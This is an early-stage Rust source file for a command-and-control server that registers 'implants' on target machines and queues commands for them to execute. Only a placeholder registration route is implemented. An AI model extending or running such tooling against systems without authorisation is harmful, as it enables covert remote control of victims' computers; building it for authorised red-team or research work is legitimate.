use axum::{
    extract::State,
    routing::{get, post},
    Json, Router
};
use dashmap::DashMap;
use std::{net::SocketAddr, sync::Arc};
use uuid::Uuid;

// GENERAL CONCEPT
// server will handle implants
// each implant has some identifying properties
// -> for now they will be very generic
// each implant can get tasks
// each implant can send back its state
// -> generalize that into a message for now

// === STRUCTS ===
struct Implant {
    id: String,         // UUID v7
    hostname: String,   // system hostname of machine on which the implant resides
    os: String,         // operating system, for now we'll just send correct implant, TODO to automatically detect OS and send correct implant
    last_seen: i64      // unix timestamp
}

struct Task {
    id: String,         // UUID v7
    command: String,    // exact command to be executed on target system
    args: String,       // arguments for the above command
    status: String,     // current status, is it sent, pending, done, etc.
    result: Option<String>
}

// === SHARED STATE ===
struct ServerState {
    implants: DashMap<String, Implant>,
    tasks: DashMap<String, Vec<Task>>
}

// === API handlers ===
// GHOST routes
async fn handle_ghost_register(State(state): State<Arc<ServerState>>) -> Json<String> {
    Json("hi".to_string())
}

// CHARON routes

#[tokio::main]
async fn main() {
    // init shared state
    let state = Arc::new(ServerState {
        implants: DashMap::new(),
        tasks: DashMap::new()
    });

    // init router with route -> handler mapping
    let app = Router::<Arc<ServerState>>::new()
        .route("/", get(|| async { "Hello, World!" }))
        .route("/ghost/register", post(handle_ghost_register))
        .with_state(state);

    // start listening
    let addr = SocketAddr::from(([127, 0, 0, 1], 9999));        // TODO: adress and port configuration via CHARON
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    
    println!("SHADOW listening on {}", addr);

    axum::serve(listener, app).await.unwrap();
    
}
